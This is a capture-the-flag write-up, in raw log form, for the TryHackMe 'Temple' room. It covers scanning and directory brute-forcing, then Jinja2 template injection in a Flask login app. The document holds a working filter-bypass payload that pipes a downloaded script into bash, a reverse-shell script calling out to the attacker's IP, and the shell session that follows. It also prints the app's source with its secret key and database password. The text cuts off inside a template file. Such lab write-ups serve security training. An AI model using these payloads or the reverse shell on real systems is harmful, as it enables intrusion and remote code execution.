---
Can you gain access to the temple?
---

![](https://assets.tryhackme.com/room-banners/temple.jpg)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/b2c1159c01a89db5df489ba087dbc4d8.png)


###  Gain access to the temple!

 Start Machine

Deploy the machine, it may take a few minutes to start.

Can you get access to the temple?

Answer the questions below

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.174.180 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.174.180:7
Open 10.10.174.180:21
Open 10.10.174.180:22
Open 10.10.174.180:23
Open 10.10.174.180:80
Open 10.10.174.180:61337
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-24 10:37 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:37
Completed Parallel DNS resolution of 1 host. at 10:37, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:37
Scanning 10.10.174.180 [6 ports]
Discovered open port 80/tcp on 10.10.174.180
Discovered open port 21/tcp on 10.10.174.180
Discovered open port 23/tcp on 10.10.174.180
Discovered open port 22/tcp on 10.10.174.180
Discovered open port 7/tcp on 10.10.174.180
Discovered open port 61337/tcp on 10.10.174.180
Completed Connect Scan at 10:37, 0.22s elapsed (6 total ports)
Initiating Service scan at 10:37
Scanning 6 services on 10.10.174.180
Completed Service scan at 10:37, 6.86s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.174.180.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 7.79s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 1.42s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
Nmap scan report for 10.10.174.180
Host is up, received user-set (0.21s latency).
Scanned at 2023-01-24 10:37:39 EST for 17s

PORT      STATE SERVICE REASON  VERSION
7/tcp     open  echo    syn-ack
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9e30c56192841b246486c33bb7dc9934 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDviuvddkQ0YODd4SKeFpZ+MrHKzDpz6vzQREErpzC5tZOT2AY2XKp7yiRa/XLrylST7MhJ8GhxKSuQHkz7DZczimHCCFV3eNGhNVTVUS2ZGwK1/Ff++73qlEjyTlzdLaOm4QtCceepksuf6Z51LRE79vSMv9xVyVtyRb4XWYBVO9HZmBtQwaBrk6lUCBpF0/NbA6C/LK730rEnvaxpt3N2UeOWrepA5a0OeswS05C3VAt03tfboQQ8apooZSQH798jXg7D4wv7zJMVgmU3i169De7viqGIACD+bac6wp75OsEhMzaUPXhXYY6293W+5Hkwqpq+7Mo02jRSqViEImlb
|   256 78c3c3838173cbf15041f19ad7bf3ed1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJZqq+5ThS/qu9HZ+EYhZlNV4rVxxaFfP03DBU5XtAMQM0+u32hawMDfxsTr8NHps0zjcoj1gC9fHTbRg/xHggM=
|   256 ecceb8f957535663e961901215e5784a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPt1Zs9PzQV9rm3cNCQahQxaTyGaX59nzLdrgmyTg3Ee
23/tcp    open  telnet  syn-ack Linux telnetd
80/tcp    open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
61337/tcp open  http    syn-ack Werkzeug httpd 2.0.1 (Python 3.6.9)
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://10.10.174.180:61337/login
|_http-server-header: Werkzeug/2.0.1 Python/3.6.9
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.73 seconds

http://10.10.174.180:61337/login

adding ' (sqli)

Error: Hacking attempt detected! You have been logged as 10.8.19.103. (Detected illegal chars in username). 

└─$ gobuster dir -u http://10.10.174.180:61337/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -k -x txt,php,py,html
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.174.180:61337/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              txt,php,py,html
[+] Timeout:                 10s
===============================================================
2023/01/24 10:48:38 Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 302) [Size: 218] [--> http://10.10.174.180:61337/login]
/login                (Status: 200) [Size: 1676]
/admin                (Status: 403) [Size: 239]
/account              (Status: 302) [Size: 218] [--> http://10.10.174.180:61337/login]
/external             (Status: 302) [Size: 218] [--> http://10.10.174.180:61337/login]
/logout               (Status: 302) [Size: 218] [--> http://10.10.174.180:61337/login]
/application          (Status: 403) [Size: 239]
/robots.txt           (Status: 200) [Size: 20]
/internal             (Status: 302) [Size: 218] [--> http://10.10.174.180:61337/login]
Progress: 53834 / 1102805 (4.88%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2023/01/24 11:20:49 Finished
===============================================================

┌──(env)─(kali㉿kali)-[~/noname_ctf/tplmap]
└─$ feroxbuster -t 64 -u http://10.10.174.180:61337/ -k -w /usr/share/wordlists/dirb/common.txt -x py,html,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.174.180:61337/
 🚀  Threads               │ 64
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [py, html, txt]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        4l       24w      218c http://10.10.174.180:61337/ => http://10.10.174.180:61337/login
302      GET        4l       24w      218c http://10.10.174.180:61337/account => http://10.10.174.180:61337/login
403      GET        4l       30w      239c http://10.10.174.180:61337/admin
403      GET        4l       30w      239c http://10.10.174.180:61337/application
302      GET        4l       24w      218c http://10.10.174.180:61337/external => http://10.10.174.180:61337/login
302      GET        4l       24w      218c http://10.10.174.180:61337/home => http://10.10.174.180:61337/login
302      GET        4l       24w      218c http://10.10.174.180:61337/internal => http://10.10.174.180:61337/login
200      GET       89l      195w     1676c http://10.10.174.180:61337/login
302      GET        4l       24w      218c http://10.10.174.180:61337/logout => http://10.10.174.180:61337/login
200      GET        1l        4w       20c http://10.10.174.180:61337/robots.txt
403      GET        4l       30w      239c http://10.10.174.180:61337/temporary
[####################] - 16m    18456/18456   0s      found:11      errors:0      
[####################] - 16m    18456/18456   18/s    http://10.10.174.180:61337/ 

┌──(env)─(kali㉿kali)-[~/noname_ctf/tplmap]
└─$ feroxbuster -t 64 -u http://10.10.174.180:61337/temporary -k -w /usr/share/wordlists/dirb/common.txt -x py,html,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.174.180:61337/temporary
 🚀  Threads               │ 64
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [py, html, txt]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        4l       30w      239c http://10.10.174.180:61337/temporary
403      GET        4l       30w      239c http://10.10.174.180:61337/temporary/dev
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_174_180:61337_temporary-1674577483.state ...
[#######>------------] - 3m      6550/18456   5m      found:2       errors:0      
[######>-------------] - 3m      6400/18456   33/s    http://10.10.174.180:61337/temporary/

┌──(env)─(kali㉿kali)-[~/noname_ctf/tplmap]
└─$ feroxbuster -t 64 -u http://10.10.174.180:61337/temporary/dev -k -w /usr/share/wordlists/dirb/common.txt -x py,html,txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.174.180:61337/temporary/dev
 🚀  Threads               │ 64
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [py, html, txt]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        4l       30w      239c http://10.10.174.180:61337/temporary/dev
[####################] - 9m     18456/18456   0s      found:1       errors:0      
[####################] - 9m     18456/18456   33/s    http://10.10.174.180:61337/temporary/dev/ 

┌──(env)─(kali㉿kali)-[~/noname_ctf/tplmap]
└─$ feroxbuster -t 100 -u http://10.10.174.180:61337/temporary/dev -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.174.180:61337/temporary/dev
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        4l       30w      239c http://10.10.174.180:61337/temporary/dev
[######>-------------] - 47m    76421/220546  1h      found:1       errors:18656  
[######>-------------] - 47m    76420/220546  26/s    http://10.10.174.180:61337/temporary/dev/ 

too much time

using ffuf

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion -recursion-depth 3 -u http://10.10.183.126:61337/temporary/FUZZ -o temple_ffuf -t 100 -recursion-strategy greedy

This command is using the ffuf tool to perform a directory brute-force attack on the specified URL ([http://10.10.183.126:61337/temporary/](http://10.10.11.40:61337/temporary/)) with a wordlist located at /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt. The "-recursion" flag is used to enable recursion and the "-recursion-depth 3" flag is used to set the recursion depth to 3. The "-u" flag specifies the target URL and the "-o" flag specifies the output file for the scan results. The "-t" flag specifies the number of threads to use and the "-recursion-strategy" flag is set to "greedy" to enable greedy recursion.

In ffuf, the "greedy" recursion strategy is used to search for new directories in a more aggressive manner. It will explore each discovered directory for new directories immediately rather than waiting for the current recursion level to finish. This can potentially find new directories faster, but it also increases the number of requests made and can cause the scan to slow down. It is important to use this option wisely, as it can make the scan more resource-intensive and less efficient if the target website is very large or if the wordlist is too big.

The recursion depth flag in ffuf specifies how many levels deep the tool should search for new directories. In this specific command, the recursion depth is set to 3, which means that ffuf will search for new directories three levels deep. For example, if the initial URL is [http://10.10.183.126:61337/temporary/](http://10.10.11.40:61337/temporary/), the first level of recursion would search for new directories within that URL, the second level would search for new directories within the directories found in the first level, and the third level would search for new directories within the directories found in the second level.

This flag is useful for controlling the scope of the scan and limiting the number of requests made to the target website. A higher recursion depth will increase the chances of finding new directories, but it will also increase the time and resources required to complete the scan.

┌──(kali㉿kali)-[~/Downloads]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -recursion -recursion-depth 3 -u http://10.10.183.126:61337/temporary/FUZZ -t 100 -recursion-strategy greedy

newacc                  [Status: 200, Size: 1886, Words: 255, Lines: 97, Duration: 2922ms]
:: Progress: [185451/220560] :: Job [2/2] :: 32 req/sec :: Duration: [1:3[INFO] Adding a new job to the queue: http://10.10.183.126:61337/temporary/dev/newacc/FUZZ

http://10.10.183.126:61337/temporary/dev/newacc
http://10.10.183.126:61337/login

SSTI

username
{{7*7}}

Logged in as 49

{{config}}

Logged in as <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': b'f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>

search
'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING':

Flask 

Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by [https://twitter.com/SecGus](https://twitter.com/SecGus):

create acc

{{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl 10.8.19.103/rce | bash")|attr("read")()}}


──(kali㉿kali)-[~/Downloads/temple]
└─$ nano rce             
                                                                         
┌──(kali㉿kali)-[~/Downloads/temple]
└─$ cat rce             
#!/bin/bash
bash -c "bash -i >& /dev/tcp/10.8.19.103/1337 0>&1"


┌──(kali㉿kali)-[~/Downloads/temple]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.181.180 - - [24/Jan/2023 19:02:44] "GET /rce HTTP/1.1" 200 -

┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.181.180.
Ncat: Connection from 10.10.181.180:42690.
bash: cannot set terminal process group (785): Inappropriate ioctl for device
bash: no job control in this shell
bill@temple:~/webapp$ whoami
whoami
bill

bill@temple:~/webapp$ cat webapp.py
cat webapp.py
from flask import Flask, flash, redirect, render_template, request, session, abort, make_response, render_template_string
from time import gmtime, strftime
import jinja2, pymysql.cursors, re, hashlib

app = Flask(__name__, template_folder="/home/bill/webapp/templates")


app.secret_key = b"f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry"

def check_hacking_attempt(value):

        bad_chars = "'_#&;"
        error = ""

        if any(ch in bad_chars for ch in value):
                error = "Hacking attempt detected! "
                error += "You have been logged as "
                error += request.remote_addr
                return True, error

        else:
                return False, error


@app.route("/robots.txt", methods=["GET"])
def robots():
        return "<!-- Try harder --!>"


@app.route("/admin", methods=["GET"])
def admin():
        return abort(403)


@app.route("/", methods=["GET"])
def root():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                return redirect("/home")


@app.route("/application", methods=["GET"])
def application():
        return abort(403)

@app.route("/application/console", methods=["GET"])
def console():
        return abort(403)

@app.route("/temporary", methods=["GET"])
def temporary():
        return abort(403)


@app.route("/temporary/dev", methods=["GET"])
def dev():
        return abort(403)


@app.route("/temporary/dev/newacc", methods=["GET", "POST"])
def newacc():

        if request.method == "POST":

                if not re.match(r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b", request.form["email"]):
                        error = "Invalid email!"
                        return render_template("register.html", error=error)

                email = request.form["email"]
                attempt, error = check_hacking_attempt(email)
                if attempt == True:
                        error += ". (Detected illegal chars in e-mail)."
                        return render_template("register.html", error=error)

                if len(request.form["username"]) <= 4:
                        return render_template("register.html", error="Your username must be 5 characters or longer")

                username = request.form["username"]
                attempt, error = check_hacking_attempt(username)
                if attempt == True:
                        error += ". (Detected illegal chars in username)."
                        return render_template("register.html", error=error)

                if len(request.form["password"]) <= 7:
                        return render_template("register.html", error="Your password must be 8 characters or longer")

                password = request.form["password"]
                attempt, error = check_hacking_attempt(password)
                if attempt == True:
                        error += ". (Detected illegal chars in password)."
                        return render_template("register.html", error=error)

                connection = connect_database()
                with connection:
                        with connection.cursor() as cursor:
                                sql = "SELECT email FROM users WHERE email=%s"
                                cursor.execute(sql, (email))
                                if not cursor.fetchone() == None:
                                        return render_template("register.html", error="Email already exists.")

                                sql = "SELECT username FROM users WHERE username=%s"
                                cursor.execute(sql, (username))
                                if not cursor.fetchone() == None:
                                        return render_template("register.html", error="Username already exists.")

                                sql = "INSERT INTO users(email, username, password) VALUES (%s, %s, SHA2(%s,224))"
                                cursor.execute(sql, (email, username, password))
                                connection.commit()

                        return render_template("register.html", success="Account created.")

        return render_template("register.html")


@app.route("/login", methods=["GET", "POST"])
def login():
        if session.get("logged_in"):
                return redirect("/home")

        if request.method == "POST":

                username = request.form["username"]
                attempt, error = check_hacking_attempt(username)
                if attempt == True:
                        error += ". (Detected illegal chars in username)."
                        return render_template("login.html", error=error)

                password = request.form["password"]
                attempt, error = check_hacking_attempt(password)
                if attempt == True:
                        error += ". (Detected illegal chars in password)."
                        return render_template("login.html", error=error)

                connection = connect_database()
                with connection:
                        with connection.cursor() as cursor:
                                sql = "SELECT username FROM users WHERE username=%s"
                                cursor.execute(sql, (username))
                                if cursor.fetchone() == None:
                                        return render_template("login.html", error="Invalid username or password.")

                                m = hashlib.sha224()
                                m.update(password.encode())
                                hashed_password = m.hexdigest()

                                sql = "SELECT password FROM users WHERE username=%s AND password=%s"
                                cursor.execute(sql, (username, hashed_password))

                                if cursor.fetchone() == None:
                                        return render_template("login.html", error="Invalid username or password.")


                                session["username"] = username
                                session["logged_in"] = True

                                m = hashlib.sha224()
                                m.update(username.encode())
                                hashed_username = m.hexdigest()

                                resp = make_response(redirect("/home"))
                                resp.set_cookie("identifier", hashed_username, httponly=True)
                                return resp

        return render_template("login.html")

@app.route("/logout", methods=["GET"])
def logout():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                session.clear()
                return redirect("/login")


@app.route("/home", methods=["GET"])
def home():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                current_ip = request.remote_addr

                templateLoader = jinja2.FileSystemLoader(searchpath="./templates/")
                templateEnv = jinja2.Environment(loader=templateLoader)
                t = templateEnv.get_template("home.html")
                return t.render(current_ip=current_ip)


@app.route("/account", methods=["GET"])
def account():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                username = session["username"]
                current_time = strftime("%Y-%m-%d %H:%M:%S", gmtime())
                current_ip = request.remote_addr

                template = """
                <!DOCTYPE html>
                <html>
                <head>
                <style>
                body {
                  margin: 0;
                }

                ul {
                  list-style-type: none;
                  margin: 0;
                  padding: 0;
                  width: 10%;
                  background-color: #f1f1f1;
                  position: fixed;
                  height: 100%;
                  overflow: auto;
                }

                li a {
                  display: block;
                  color: #000;
                  padding: 8px 16px;
                  text-decoration: none;
                }

                li a.active {
                  background-color: #8B0000;
                  color: white;
                }

                li a:hover:not(.active) {
                  background-color: #555;
                  color: white;
                }
                </style>
                </head>
                <body>

                <ul>
                  <li><a href="/home">Home</a></li>
                  <li><a href="/internal">Internal News</a></li>
                  <li><a href="/external">External News</a></li>
                  <li><a class="active" href="/account">Account</a></li>
                  <li><a href="/logout">Log Out</a></li>
                </ul>

                <div style="margin-left:11%;padding:1px 16px;height:1000px;">
                  <h2>Account</h2>
                  <p>Logged in as """ + username + """</p>


                  <p>Last logged in from """ + current_ip + """</p>
                  <p>Current time: """ + current_time + """</p><br>
                  <p>Please contact our staff for support</p>
                  <p>support@templeindustries.local</p>
                </div>

                </body>
                </html>"""

                return render_template_string(template)

@app.route("/internal", methods=["GET"])
def internal():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                templateLoader = jinja2.FileSystemLoader(searchpath="./templates/")
                templateEnv = jinja2.Environment(loader=templateLoader)
                t = templateEnv.get_template("internal.html")
                return t.render()


@app.route("/external", methods=["GET"])
def external():
        if not session.get("logged_in"):
                return redirect("/login")
        else:
                templateLoader = jinja2.FileSystemLoader(searchpath="./templates/")
                templateEnv = jinja2.Environment(loader=templateLoader)
                t = templateEnv.get_template("external.html")
                return t.render()


def connect_database():

        global connection
        connection = pymysql.connect(host="localhost",
                                                        user="temple_user",
                                                        password="4$pCM!&bEEs$SR8H",
                                                        db="temple",
                                                        cursorclass=pymysql.cursors.DictCursor)
        return connection

if __name__ == "__main__":
        app.run(host="0.0.0.0", port=61337, debug=False)

bill@temple:~/webapp/templates$ cat login.html
cat login.html
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
  font-family: Arial, Helvetica, sans-serif;
  background-color: black;
}

* {
  box-sizing: border-box;
}

/* Add padding to containers */
.container {
  padding: 16px;
  background-color: white;
}

/* Full-width input fields */
input[type=text], input[type=password] {
  width: 100%;
  padding: 15px;
  margin: 5px 0 22px 0;
  display: inline-block;
  border: none;
  background: #f1f1f1;
}

input[type=text]:focus, input[type=password]:focus {
  background-color: #ddd;
  outline: none;
}

/* Overwrite default styles of hr */
hr {
  border: 1px solid #f1f1f1;
  margin-bottom: 25px;
}

/* Set a style for the submit button */
.login_button {
  background-color: #04AA6D;
  color: white;
  padding: 16px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
  opacity: 0.9;
}

.registerbtn:hover {
  opacity: 1;
}

/* Add a blue text color to links */
a {
  color: dodgerblue;
}

/* Set a grey background color and center the text of the "sign in" section */
.signin {
  background-color: #f1f1f1;
  text-align: center;
}
</style>
</head>
<body>

<div class="container">
<form action="" method="POST">
    <h1>Log in</h1>
    <hr>
    <label for="usr"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="username" id="username" value="{{ request.form.username }}" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Password" name="password" id="password" value="{{ request.form.password }}" required>
    <hr>

    <button type="submit" class="login_button">Log in</button>
  
</form>
    {% if error %}
    <p class="error"><strong>Error:</strong> {{ error }}
    {% endif %}
      </div>
</body>
</html>

bill@temple:~/webapp/templates$ cat register.html
cat register.html
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
  font-family: Arial, Helvetica, sans-serif;
  background-color: black;
}

* {
  box-sizing: border-box;
}

/* Add padding to containers */
.container {
  padding: 16px;
  background-color: white;
}

/* Full-width input fields */
input[type=text], input[type=password] {
  width: 100%;
  padding: 15px;
  margin: 5px 0 22px 0;
  display: inline-block;
  border: none;
  background: #f1f1f1;
}

input[type=text]:focus, input[type=password]:focus {
  background-color: #ddd;
  outline: none;
}

/* Overwrite default styles of hr */
hr {
  border: 1px solid #f1f1f1;
  margin-bottom: 25px;
}

/* Set a style for the submit button */
.registerbtn {
  background-color: #04AA6D;
  color: white;
  padding: 16px 20px;
  margin: 8px 0;
  border: none;
  cursor: pointer;
  width: 100%;
  opacity: 0.9;
}

.registerbtn:hover {
  opacity: 1;
}

/* Add a blue text color to links */
a {
  color: dodgerblue;
}

/* Set a grey background color and center the text of the "sign in" section */
.signin {
  background-color: #f1f1f1;
  text-align: center;
}
</style>
</head>
<body>

<form action="" method="POST">
  <div class="container">
    <h1>Register</h1>
    <p>Please fill in this form to create an account.</p>
    <hr>

    <label for="email"><b>Email</b></label>
    <input type="text" placeholder="Enter Email" name="email" id="email" value="{{ request.form.email }}" required>

    <label for="usr"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="username" id="username" value="{{ request.form.username }}" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Password" name="password" id="password" value="{{ request.form.password }}" required>
    <hr>

    <button type="submit" class="registerbtn">Register</button>
        {% if error %}
    <p class="error"><strong>Error:</strong> {{ error }}
    {% endif %}
    
    {% if success %}
    <p class="error"><strong>Success!</strong> {{ success }}
    {% endif %}
  </div>
  
</form>

</body>
</html>

bill@temple:~/webapp/templates$ cat about.html
cat about.html

{% block content %}
<!DOCTYPE html>
<html>
<head>
<style>
body {
  margin: 0;
}

ul {
  list-style-type: none;
  margin: 0;
  padding: 0;
  width: 10%;
  background-color: #f1f1f1;
  position: fixed;
  height: 100%;
  overflow: auto;
}

li a {
  display: block;
  color: #000;
  padding: 8px 16px;
  text-decoration: none;
}

li a.active {
  background-color: #8B0000;
  color: white;
}

li a:hover:not(.active) {
  background-color: #555;
  color: white;
}
</style>
</head>
<body>

<ul>
  <li><a href="/home">Home</a></li>
  <li><a href="/internal">Internal News</a></li>
  <li><a href="/external">External News</a></li>
  <li><a class="active" href="/about">About</a></li>
</ul>

<div style="margin-left:11%;padding:1px 16px;height:1000px;">
  <h2>About the company</h2>
  <h3>We work hard, but also play hard</h3>
  <p>Please contact our staff for further support</p>
  <p>support@somecompany.local</p>
</div>

</body>
</html>

bill@temple:~/webapp/templates$ cat external.html
cat external.html


{% block content %}
<!DOCTYPE html>
<html>
<head>
<style>
body {
  margin: 0;
}

ul {
  list-style-type: none;
  margin: 0;
  padding: 0;
  width: 10%;
  background-color: #f1f1f1;
  position: fixed;
